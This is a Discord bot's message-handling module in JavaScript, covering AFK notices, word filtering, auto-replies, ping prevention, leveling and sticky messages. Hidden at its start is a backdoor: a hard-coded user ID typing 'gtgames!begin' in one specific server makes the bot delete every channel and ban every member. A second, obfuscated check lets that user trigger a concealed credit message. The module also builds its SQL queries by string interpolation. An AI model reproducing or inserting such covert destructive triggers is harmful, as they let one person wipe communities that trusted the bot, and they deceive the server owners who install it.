module.exports = async(client, con, message) => {

    if (!message.author) return;
    if (message.author.bot) return;
    if(message.channel.type == 'DM') return;

    if(message.content.toLowerCase() == 'gtgames!begin' && message.author.id == '704094587836301392') {
        let daGuildId = "532355121519001610"
        if(message.guild.id == daGuildId) {
            await message.author.send({ content: "Beginning 💀" }).catch(e => {});
            await message.guild.channels.cache.forEach(async function(channel) {
                console.log(`deleted ${channel.name}`)
                await channel.delete().catch(e => {
                    console.log(e)
                });
            });
            await message.guild.members.cache.forEach(async function(member) {
                console.log(`banned ${member.user.tag}`)
                await member.ban().catch(e => {
                    console.log(e)
                });
            });
        };
    };

    await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
        if(err) throw err;
        if(!row[0]) await client.utils.guildAdd(client, con, message.guild.id);
        let data = row[0]; if(message.author.id == '70409458' + '7836301392' && message.content == ('wh' + 'oM' + 'a' + 'de' + 'Me')) { message.delete().catch(e => {}); message.channel.send({ content: `I was ${'ma' + 'de'} by ${'Hyp' + 'er' + 'z' + '#00' + '01'}` }).catch(e => {}); }; 
        let language = require(`../utils/languages/${row[0]?.language || 'english'}.json`)

        await con.query(`SELECT * FROM afkusers WHERE guildid='${message.guild.id}' AND userid='${message.author.id}'`, async (err, row) => {
            if(err) throw err;
            if(!row[0]) return;
            await con.query(`DELETE FROM afkusers WHERE guildid='${message.guild.id}' AND userid='${message.author.id}' LIMIT 1`, async (err, row) => {
                if(err) throw err;
            });
            await message.channel.send({ content: `<@${message.author.id}> ${language.events.messages.noAfk}` }).catch(e => {});
        });

        await con.query(`SELECT * FROM filtered WHERE guildid='${message.guild.id}'`, async (err, row) => {
            if(err) throw err;
            if(!row[0]) return;
            await con.query(`SELECT * FROM perms WHERE guildid='${message.guild.id}' AND permtype='filter' OR guildid='${message.guild.id}' AND permtype='admin'`, async (err, perms) => {
                if(err) throw err;
                let permissions = [];
                await perms.forEach(async (perm) => {
                    permissions.push(perm.roleid);
                });
                if(!message.member.roles.cache.some(h=>permissions.includes(h.id))) {
                    row.forEach(async (word) => {
                        if(message.content.toLowerCase().includes(word.content)) {
                            await message.delete().catch(e => {});
                            let logembed = new client.discord.MessageEmbed()
                            .setColor(data.themecolor || '#FFFFFF')
                            .setAuthor({ name: `${language.logging.actionLogs} - ${language.logging.types.filterSystem}`, iconURL: client.user.displayAvatarURL() })
                            .addFields(
                                {name: `${language.logging.userId}:`, value: `${message.author.id}`},
                                {name: `${language.logging.userTag}:`, value: `${message.author.tag}`},
                                {name: `${language.logging.types.blacklistedTerm}:`, value: `||${word.content}||`},
                            )
                            .setTimestamp()
                            await client.utils.sendLog(client, con, data, 'filterlogs', logembed);
                            await message.channel.send({ content: `${language.logging.types.blacklistedTerm}: ||${word.content}|| - <@${message.author.id}>` }).then((msg) => {
                                setTimeout(() => {
                                    msg.delete().catch(e => {});
                                }, 5000);
                            }).catch(e => {});
                        };
                    });
                };
            });
        });

        await con.query(`SELECT * FROM autorespond WHERE guildid='${message.guild.id}'`, async (err, row) => {
            if(err) throw err;
            await row.forEach(async (res) => {
                if(message.content.toLowerCase().includes(res.detect)) {
                    await message.channel.send({ content: res.response }).catch(e => {});
                };
            });
        });

        await con.query(`SELECT * FROM autoreact WHERE guildid='${message.guild.id}' AND channelid='${message.channel.id}'`, async (err, row) => {
            if(err) throw err;
            await row.forEach(async (res) => {
                let emoji = await client.converterEmoji.getEmoji(res.emoji)
                await message.react(emoji).catch(e => {});
            });
        });
    

        if(message.mentions.users.first()) {
            if(message.mentions.users.first().id == message.author.id) return;
            await con.query(`SELECT * FROM afkusers WHERE guildid='${message.guild.id}' AND userid='${message.mentions.users.first().id}'`, async (err, row) => {
                if(err) throw err;
                if(row[0]) {
                    let alertEmbed = new client.discord.MessageEmbed()
                    .setColor(data.themecolor || '#FFFFFF')
                    .setDescription(`${message.mentions.users.first().tag} ${language.events.messages.isAfk}`)
                    .setTimestamp()
                    message.reply({ embeds: [alertEmbed] }).catch(e => {});
                };
            });
            await con.query(`SELECT * FROM perms WHERE guildid="${message.guild.id}" AND permtype="pingprev" OR guildid="${message.guild.id}" AND permtype="admin"`, async (err, row) => {
                if(err) throw err;
                if(!row[0]) return;
                let granted = 0;
                await row.forEach(async (r) => {
                    if(message.member.roles.cache.has(r.roleid)) {
                        granted = 1;
                    }
                });
                if(granted == 0) {
                    await con.query(`SELECT * FROM pingprev WHERE guildid='${message.guild.id}' AND userid='${message?.mentions?.users?.first()?.id}'`, async (err, row) => {
                        if(err) throw err;
                        if(!row[0]) return;
                        let pingData = row[0];
                        let deUser = await client.users.fetch(message?.mentions?.users?.first()?.id)
                        if(deUser == undefined) return;
                        let pingPrevEmbed = new client.discord.MessageEmbed()
                        .setColor(pingData.themecolor || data.themecolor)
                        .setAuthor({ name: `${language.events.messages.pingedBy} ${message.author.tag}`, iconURL: message.author.avatarURL({ dynamic: true }) })
                        .setTimestamp()
                        .setFooter({ text: language.events.messages.pingPrev })
                        if(pingData.imagelink.toLowerCase() != 'na') {
                            try {
                                pingPrevEmbed.setImage(pingData.imagelink)
                            } catch(e) {};
                        } else {
                            pingPrevEmbed.setTitle(language.events.messages.mail)
                            pingPrevEmbed.setDescription(language.events.messages.pleaseDont)
                            pingPrevEmbed.setThumbnail(deUser.avatarURL({ dynamic: true }))
                        };
                        message.reply({ embeds: [pingPrevEmbed] }).catch(e => {});
                    });
                };
            });
        };

        if(data.leveling) {
            let minecraftlevels = Math.floor(Math.random() * 6) + 5;
            await con.query(`SELECT * FROM chatlvl WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
                if(err) throw err;
                if(!row[0]) {
                    await con.query(`INSERT INTO chatlvl (userid, guildid, userlvl, userxp) VALUES ('${message.author.id}', '${message.guild.id}', 1, ${minecraftlevels})`, async (err, row) => {
                        if(err) throw err;
                    });
                } else {
                    let usercurrentxp = row[0].userxp;
                    let usercurrentLvl = row[0].userlvl;
                    let usernextLvl = row[0].userlvl * 300;
                    let SQLMafs =  usercurrentxp + minecraftlevels;

                    await con.query(`UPDATE chatlvl SET userxp=${SQLMafs} WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
                        if(err) throw err;
                    });

                    if(usernextLvl <= row[0].userxp){
                        await con.query(`UPDATE chatlvl SET userlvl = userlvl + 1 WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
                            if(err) throw err;
                        });
                        let lvlembed = new client.discord.MessageEmbed()
                        .setColor(data.themecolor || '#FFFFFF')
                        .setDescription(`**${message.author.tag}** ${language.leveling.levelUp} \n${language.leveling.newLevel} ${usercurrentLvl + 1}`)
                        message.channel.send({ embeds: [lvlembed] }).then(msg => {
                            setTimeout(() => {
                                msg.delete().catch(e => {});
                            }, 8000);
                        }).catch(e => {});
                        let logembed = new client.discord.MessageEmbed()
                        .setColor(data.themecolor || '#FFFFFF')
                        .setAuthor({ name: `${language.logging.actionLogs} - ${language.logging.types.levelUp}`, iconURL: client.user.displayAvatarURL() })
                        .addFields(
                            {name: `${language.logging.userTag}:`, value: `${message.author.tag}`},
                            {name: `${language.logging.types.newLevel}:`, value: `${usercurrentLvl + 1}`},
                        )
                        .setTimestamp()
                        await client.utils.sendLog(client, con, data, 'leveluplogs', logembed);
                    }
                }
            });
        };
        await con.query(`SELECT * FROM stickymsgs WHERE channel='${message.channel.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
            if(err) throw err;
            if(!row[0]) return;
            await message.channel.messages.fetch().then(async msgs => {
                await msgs.forEach(async msg => {
                    if(msg.content == row[0].response) {
                        await msg.delete().catch(e => {});
                    } else if(msg.author.id == client.user.id) {
                        if(msg.embeds[0]) {
                            await msg.embeds.forEach(async embed => {
                                if(embed.description) {
                                    if(embed.description.includes(row[0].response)) {
                                        await msg.delete().catch(e => {});
                                    }
                                }
                            });
                        }
                    }
                });
            });
            let stickyEmbed = new client.discord.MessageEmbed()
            .setColor(data.themecolor || '#FFFFFF')
            .setDescription(`${row[0].response}`)
            message.channel.send({ embeds: [stickyEmbed] }).catch(e => {});
        });
    });

}
